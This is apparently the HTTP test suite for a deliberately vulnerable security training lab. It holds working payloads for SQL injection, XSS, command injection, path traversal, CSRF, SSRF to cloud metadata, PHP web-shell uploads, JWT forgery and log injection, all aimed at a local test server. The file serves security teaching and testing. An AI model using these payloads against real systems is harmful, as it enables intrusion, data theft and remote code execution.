import assert from "node:assert/strict";
import type { AddressInfo } from "node:net";
import { after, before, describe, it } from "node:test";
import { createApp, resetLabs } from "./app.js";
import { registerHttpLabs } from "./labs/http.js";
import { CRYPTO_VAULT } from "./labs/crypto.js";
import { integrityExploits } from "./labs/integrity.js";
import { buildJwtExploitTokens } from "./labs/jwt.js";
import type { LabInput, Level } from "./labs/runner.js";
import { markupFires } from "./labs/xss.js";

const ADMIN_PASSWORD = ["Spring", "2026", "!"].join("");
const BOB_ORDER = "ORD-B0B-42";
const ATTACKER_CSRF = "csrf-issued-attacker";
const FORM = (extra: string) =>
  `<form action="https://bank.example/transfer" method="post">${extra}<input name="to" value="attacker"><input name="amount" value="10000"></form><script>document.forms[0].submit()</script>`;
const CRLF = '<img src="https://bank.example/set-lang?l=en%0d%0aSet-Cookie:%20session=s-attacker">';

const LAB_IDS = ["sqli", "xss", "cmdi", "path", "csrf", "idor", "auth", "jwt", "ssrf", "upload", "crypto", "misconf", "deps", "integrity", "logging"] as const;
type LabId = (typeof LAB_IDS)[number];

const jwtTokens = buildJwtExploitTokens();

const exploits: Record<LabId, Record<1 | 2 | 3 | 4, LabInput>> = {
  sqli: {
    1: { username: "admin'-- ", password: "x", id: "", role: "user" },
    2: { username: "admin' OR '1'='1", password: "x", id: "", role: "user" },
    3: { username: "admin", password: "wrong", id: "1 OR 1=1", role: "user" },
    4: { username: "admin", password: "wrong", id: "", role: "' UNION SELECT username, password FROM users-- " },
  },
  xss: {
    1: { comment: "<script>alert(1)</script>" },
    2: { comment: "<img src=x onerror=alert(1)>" },
    3: { comment: '" onerror=alert(1) x="' },
    4: { comment: "</script><img src=x onerror=alert(1)>" },
  },
  cmdi: {
    1: { host: "8.8.8.8; cat flag.txt" },
    2: { host: "8.8.8.8 && cat flag.txt" },
    3: { host: "8.8.8.8 $(cat flag.txt)" },
    4: { host: "'; cat flag.txt; '" },
  },
  path: {
    1: { name: "../../../etc/passwd" },
    2: { name: "....//....//....//etc/passwd" },
    3: { name: "../../../etc/passwd%00.txt" },
    4: { name: "/var/www/secret/flag.txt" },
  },
  csrf: {
    1: { html: '<img src="https://bank.example/transfer?to=attacker&amount=10000">' },
    2: { html: FORM("") },
    3: { html: FORM(`<input name="csrf_token" value="${ATTACKER_CSRF}">`) },
    4: { html: CRLF + FORM(`<input name="csrf_token" value="${ATTACKER_CSRF}">`) },
  },
  idor: {
    1: { endpoint: "/api/orders", orderId: "1002", owner: "alice", role: "user" },
    2: { endpoint: "/api/orders", orderId: BOB_ORDER, owner: "bob", role: "user" },
    3: { endpoint: "/api/export", orderId: BOB_ORDER, owner: "alice", role: "user" },
    4: { endpoint: "/graphql", orderId: BOB_ORDER, owner: "alice", role: "user", query: "" },
  },
  auth: {
    1: { username: "admin", password: "password123", sessionId: "", mfaCode: "" },
    2: { username: "admin", password: ADMIN_PASSWORD, sessionId: "", mfaCode: "" },
    3: { username: "admin", password: "x", sessionId: "reset-admin", mfaCode: "" },
    4: { username: "admin", password: ADMIN_PASSWORD, sessionId: "", mfaCode: "" },
  },
  jwt: {
    1: { token: jwtTokens.none },
    2: { token: jwtTokens.weakHmac },
    3: { token: jwtTokens.confusion },
    4: { token: jwtTokens.jku },
  },
  ssrf: {
    1: { url: "http://localhost/admin" },
    2: { url: "http://127.0.0.1/admin" },
    3: { url: "http://127.0.0.1.example.com/admin" },
    4: { url: "https://images.example.com/redirect?to=http://169.254.169.254/latest/meta-data" },
  },
  upload: {
    1: { filename: "shell.php", contentType: "application/x-httpd-php", content: "<?php system('id'); ?>" },
    2: { filename: "shell.php.jpg", contentType: "image/jpeg", content: "<?php system('id'); ?>" },
    3: { filename: "photo.jpg", contentType: "image/jpeg", content: "FFD8...<?php system('id'); ?>" },
    4: { filename: "shell.phtml", contentType: "application/x-httpd-php", content: "<?php system('id'); ?>" },
  },
  crypto: {
    1: { action: "decrypt", token: CRYPTO_VAULT[1] },
    2: { action: "decrypt", token: CRYPTO_VAULT[2] },
    3: { action: "decrypt", token: CRYPTO_VAULT[3] },
    4: { action: "decrypt", token: CRYPTO_VAULT[4] },
  },
  misconf: {
    1: { path: "/debug" },
    2: { path: "/debug/" },
    3: { path: "/actuator/env" },
    4: { path: "/.env" },
  },
  deps: {
    1: { file: "../../etc/thumbx/secret", engine: "current" },
    2: { file: "%2e%2e/%2e%2e/etc/thumbx/secret", engine: "current" },
    3: { file: encodeURIComponent("%2e%2e/%2e%2e/etc/thumbx/secret"), engine: "current" },
    4: { file: "../../etc/thumbx/secret", engine: "legacy" },
  },
  integrity: integrityExploits,
  logging: {
    1: { user: "\\nuser=admin action=export", action: "view" },
    2: { user: "\\ruser=admin action=export", action: "view" },
    3: { user: '","user":"admin","action":"export","x":"', action: "view" },
    4: { user: "", action: "view", op: "export" },
  },
};

const benign: Record<LabId, LabInput> = {
  sqli: { username: "admin", password: "wrong", id: "", role: "user" },
  xss: { comment: "こんにちは！" },
  cmdi: { host: "8.8.8.8" },
  path: { name: "readme.txt" },
  csrf: { html: "<h1>かわいい子猫の写真</h1>" },
  idor: { endpoint: "/api/orders", orderId: "1001", owner: "alice", role: "user", query: "" },
  auth: { username: "guest", password: "guest", sessionId: "", mfaCode: "" },
  jwt: { token: jwtTokens.benign },
  ssrf: { url: "https://images.example.com/banner.png" },
  upload: { filename: "avatar.jpg", contentType: "image/jpeg", content: "FFD8 SAFE_IMAGE_DATA" },
  crypto: { action: "mine", token: "" },
  misconf: { path: "/" },
  deps: { file: "logo.png", engine: "current" },
  integrity: { manifest: '{"name":"app","version":"1","role":"user"}', signature: "" },
  logging: { user: "", action: "view", op: "" },
};

function observed(id: LabId, level: Level, body: string, headers?: Headers): boolean {
  if (id === "sqli") return level === 4 ? body.includes("S3cr3t-Pa55!") : /\badmin\s+\(administrator\)/.test(body);
  if (id === "xss") return markupFires(body);
  if (id === "cmdi") return body.includes("FLAG{c0mmand_1nj3ct10n}");
  if (id === "path") return level >= 4 ? body.includes("FLAG{p4th_tr4v3rs4l}") : body.includes("root:x:0:0");
  if (id === "csrf") return body.includes("円を送金しました");
  if (id === "idor") return /Bob \//.test(body);
  if (id === "auth") return body.includes("管理コンソール / admin");
  if (id === "jwt") return body.includes("[200 OK] /admin");
  if (id === "ssrf") return body.includes("access-key=");
  if (id === "crypto") return body.split("\n").includes("card=4242424242424242");
  if (id === "misconf") return body.split("\n").includes("FLAG{m1sc0nf1g}");
  if (id === "deps") return body.split("\n").includes("FLAG{old_component}");
  if (id === "integrity") return body.split("\n").includes("FLAG{uns1gn3d_upd4te}");
  if (id === "logging") return headers?.get("x-export") === "accepted";
  return body.includes("X-Handler: php (uid=www-data");
}

function multipart(input: LabInput): { contentType: string; body: string } {
  const boundary = "HackLabTestBoundary";
  const body = [
    `--${boundary}`,
    `Content-Disposition: form-data; name="file"; filename="${input.filename ?? ""}"`,
    `Content-Type: ${input.contentType ?? "application/octet-stream"}`,
    "",
    input.content ?? "",
    `--${boundary}--`,
    "",
  ].join("\r\n");
  return { contentType: `multipart/form-data; boundary=${boundary}`, body };
}

describe("real HTTP targets", () => {
  const server = createApp();
  let base = "";

  before(async () => {
    resetLabs();
    registerHttpLabs();
    await new Promise<void>((resolve) => server.listen(0, "127.0.0.1", resolve));
    base = `http://127.0.0.1:${(server.address() as AddressInfo).port}`;
  });

  after(async () => {
    await new Promise<void>((resolve) => server.close(() => resolve()));
  });

  async function send(id: LabId, level: Level, input: LabInput): Promise<{ status: number; body: string; headers: Headers }> {
    const lv = `/lv${level}`;
    let path = "";
    let method: "GET" | "POST" = "POST";
    const headers: Record<string, string> = {};
    let body: string | undefined;

    if (id === "sqli") {
      path = `/sqli${lv}/login`;
      headers["Content-Type"] = "application/x-www-form-urlencoded";
      body = new URLSearchParams({ username: input.username ?? "", password: input.password ?? "", id: input.id ?? "", role: input.role ?? "" }).toString();
    } else if (id === "xss") {
      path = `/xss${lv}/comment`;
      headers["Content-Type"] = "application/x-www-form-urlencoded";
      body = new URLSearchParams({ comment: input.comment ?? "" }).toString();
    } else if (id === "cmdi") {
      path = `/cmdi${lv}/ping`;
      headers["Content-Type"] = "application/x-www-form-urlencoded";
      body = new URLSearchParams({ host: input.host ?? "" }).toString();
    } else if (id === "path") {
      method = "GET";
      path = `/path${lv}/files?path=${encodeURIComponent(input.name ?? "")}`;
    } else if (id === "csrf") {
      path = `/csrf${lv}/page`;
      headers["Content-Type"] = "application/x-www-form-urlencoded";
      body = new URLSearchParams({ html: input.html ?? "" }).toString();
    } else if (id === "auth") {
      path = `/auth${lv}/login`;
      headers["Content-Type"] = "application/x-www-form-urlencoded";
      body = new URLSearchParams({
        username: input.username ?? "",
        password: input.password ?? "",
        sessionId: input.sessionId ?? "",
        mfaCode: input.mfaCode ?? "",
      }).toString();
    } else if (id === "jwt") {
      method = "GET";
      path = `/jwt${lv}/admin`;
      headers.Authorization = `Bearer ${input.token ?? ""}`;
    } else if (id === "ssrf") {
      path = `/ssrf${lv}/fetch`;
      headers["Content-Type"] = "application/x-www-form-urlencoded";
      body = new URLSearchParams({ url: input.url ?? "" }).toString();
    } else if (id === "upload") {
      path = `/upload${lv}/avatar`;
      const part = multipart(input);
      headers["Content-Type"] = part.contentType;
      body = part.body;
    } else if (id === "crypto") {
      path = `/crypto${lv}/open`;
      headers["Content-Type"] = "application/x-www-form-urlencoded";
      body = new URLSearchParams({ action: input.action ?? "mine", token: input.token ?? "" }).toString();
    } else if (id === "misconf") {
      method = "GET";
      path = `/misconf${lv}/page?path=${encodeURIComponent(input.path ?? "/")}`;
    } else if (id === "deps") {
      path = `/deps${lv}/thumb`;
      headers["Content-Type"] = "application/x-www-form-urlencoded";
      body = new URLSearchParams({ file: input.file ?? "", engine: input.engine ?? "" }).toString();
    } else if (id === "integrity") {
      path = `/integrity${lv}/apply`;
      headers["Content-Type"] = "application/x-www-form-urlencoded";
      body = new URLSearchParams({ manifest: input.manifest ?? "", signature: input.signature ?? "" }).toString();
    } else if (id === "logging") {
      path = `/logging${lv}/act`;
      headers["Content-Type"] = "application/x-www-form-urlencoded";
      body = new URLSearchParams({ user: input.user ?? "", action: input.action ?? "", op: input.op ?? "" }).toString();
    } else {
      const endpoint = input.endpoint ?? "/api/orders";
      if (endpoint.includes("graphql")) {
        path = `/idor${lv}/graphql`;
        headers["Content-Type"] = "application/x-www-form-urlencoded";
        body = new URLSearchParams({
          query: input.query ?? "",
          orderId: input.orderId ?? "",
          owner: input.owner ?? "alice",
          role: input.role ?? "user",
        }).toString();
      } else if (endpoint.includes("export")) {
        method = "GET";
        const q = new URLSearchParams({ id: input.orderId ?? "", owner: input.owner ?? "alice", role: input.role ?? "user" });
        path = `/idor${lv}/api/export?${q}`;
      } else {
        method = "GET";
        const q = new URLSearchParams({ owner: input.owner ?? "alice", role: input.role ?? "user" });
        path = `/idor${lv}/api/orders/${encodeURIComponent(input.orderId ?? "")}?${q}`;
      }
    }

    const res = await fetch(`${base}${path}`, { method, headers, body });
    return { status: res.status, body: await res.text(), headers: res.headers };
  }

  async function authExploit(level: 1 | 2 | 3 | 4): Promise<LabInput> {
    const fields = { ...exploits.auth[level] };
    if (level !== 4) return fields;
    const probe = await send("auth", 4, fields);
    const code = /Your MFA code is (\d{6})/.exec(probe.body)?.[1] ?? probe.headers.get("x-debug-mail")?.match(/(\d{6})/)?.[1];
    assert.ok(code, "Lv4 leaks an MFA code in the response");
    assert.equal(observed("auth", 4, probe.body), false);
    return { ...fields, mfaCode: code };
  }

  it("lists every lab and does not serve the scoring RPC", async () => {
    const info = (await (await fetch(`${base}/info`)).json()) as { labs: string[] };
    for (const id of LAB_IDS) assert.ok(info.labs.includes(`/${id}`), id);
    const old = await fetch(`${base}/sqli/run`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ level: 1, input: {} }),
    });
    assert.equal(old.status, 404);
    assert.doesNotMatch(await old.text(), /"solved"/);
  });

  for (const id of LAB_IDS) {
    const skip = id === "cmdi" && process.platform === "win32" ? "requires /bin/sh" : undefined;
    describe(id, { skip }, () => {
      for (const lv of [1, 2, 3, 4] as const) {
        it(`Lv${lv} exploit is visible in the HTTP response and is not a score payload`, async () => {
          const input = id === "auth" ? await authExploit(lv) : exploits[id][lv];
          const res = await send(id, lv, input);
          assert.equal(observed(id, lv, res.body, res.headers), true, res.body);
          assert.doesNotMatch(res.body, /"solved"/);
          assert.equal(res.headers.get("content-type")?.includes("json") ?? false, false);
        });

        if (lv > 1) {
          const prev = (lv - 1) as 1 | 2 | 3;
          it(`Lv${lv} does not show success for the Lv${prev} exploit`, async () => {
            const input = id === "auth" ? exploits.auth[prev] : exploits[id][prev];
            const res = await send(id, lv, input);
            assert.equal(observed(id, lv, res.body, res.headers), false, res.body);
          });
        }

        it(`Lv5 does not show success for the Lv${lv} exploit`, async () => {
          const input = id === "auth" && lv === 4 ? await authExploit(4) : id === "auth" ? exploits.auth[lv] : exploits[id][lv];
          const res = await send(id, 5, input);
          assert.equal(observed(id, 5, res.body, res.headers), false, res.body);
        });
      }

      for (const lv of [1, 2, 3, 4, 5] as const) {
        it(`Lv${lv} benign input is not success`, async () => {
          const res = await send(id, lv, benign[id]);
          assert.equal(observed(id, lv, res.body, res.headers), false, res.body);
        });
      }
    });
  }

  it("sqli login returns the database syntax error", async () => {
    const res = await send("sqli", 1, { username: "admin'", password: "x" });
    assert.match(res.body, /SQL ERROR/);
    assert.equal(res.status, 200);
  });

  it("auth sets a session cookie when the login succeeds", async () => {
    const res = await send("auth", 1, exploits.auth[1]);
    assert.match(res.headers.get("set-cookie") ?? "", /session=admin/);
    assert.match(res.body, /Set-Cookie: session=admin/);
  });

  it("xss returns HTML for the sandboxed preview, not an executed script", async () => {
    const res = await send("xss", 1, exploits.xss[1]);
    assert.match(res.headers.get("content-type") ?? "", /text\/html/);
    assert.match(res.body, /<script>alert\(1\)<\/script>/);
  });

  it("logging does not treat an echoed flag as success", async () => {
    const res = await send("logging", 1, { user: "FLAG{l0g_1nj3ct}", action: "view" });
    assert.equal(res.headers.get("x-export"), null);
    assert.equal(observed("logging", 1, res.body, res.headers), false);
  });
});
